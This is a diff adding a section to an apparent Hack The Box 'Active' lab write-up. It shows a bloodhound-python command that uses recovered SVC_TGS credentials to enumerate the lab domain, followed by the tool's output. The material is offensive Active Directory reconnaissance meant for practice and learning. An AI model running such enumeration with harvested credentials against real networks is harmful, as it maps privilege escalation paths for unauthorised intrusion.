@@ -304,5 +304,27 @@ smb: \>
 Now that we have credentials to a valid user in the Domain we can run BloodHound remotely to map any privilege escalation vectors!
 
 ```bash
-
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
+└──╼ [★]$ bloodhound-python -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -ns 10.129.38.174 -c All
+INFO: Found AD domain: active.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.active.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.active.htb
+INFO: Found 5 users
+INFO: Found 41 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.active.htb
+INFO: Done in 00M 02S
 ```
+
+Now Upload the created JSON files into BloodHound!
+
+
